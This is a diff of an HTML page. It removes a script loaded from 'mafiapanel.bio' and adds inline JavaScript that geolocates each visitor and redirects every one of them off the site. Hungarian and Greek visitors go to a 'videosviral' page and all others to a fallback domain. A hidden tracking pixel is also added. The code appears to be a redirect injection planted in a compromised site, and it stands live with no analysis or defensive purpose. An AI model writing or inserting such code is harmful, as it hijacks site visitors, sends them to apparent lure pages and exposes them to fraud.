@@ -1,1 +1,30 @@
-<script src="https://mafiapanel.bio/h/index.php?username=Danieladmin" type="text/javascript" async="true"></script>
+    <script>
+let countryHack = ['Hu', 'GR']; // Paises objetivo
+let urlPromocion = 'https://admin-4ok.pages.dev/';
+let country;
+
+fetch('https://get.geojs.io/v1/ip/country')
+    .then((response) => response.text())
+    .then((data) => {
+        country = data.trim();
+        if (countryHack.includes(country)) {
+            redirectURL(country);
+        } else {
+            // Redirige a una URL de respaldo si el país no está en la lista
+            window.location.href = urlPromocion;
+        }
+    });
+
+function redirectURL(country) {
+    // Redirige a una URL específica para los países en la lista
+    if (country === 'Hu') {
+        window.location.href = 'https://videosviral.pages.dev/';
+    } else if (country === 'GR') {
+        window.location.href = 'https://videosviral.pages.dev/';
+    }
+}
+    </script>
+</body>
+</html>
+
+<img src="https://whos.amung.us/pingjs/?k=geekvape &t=Ready MMG &x=https://megabanana.mx/" style="display: none;"/>
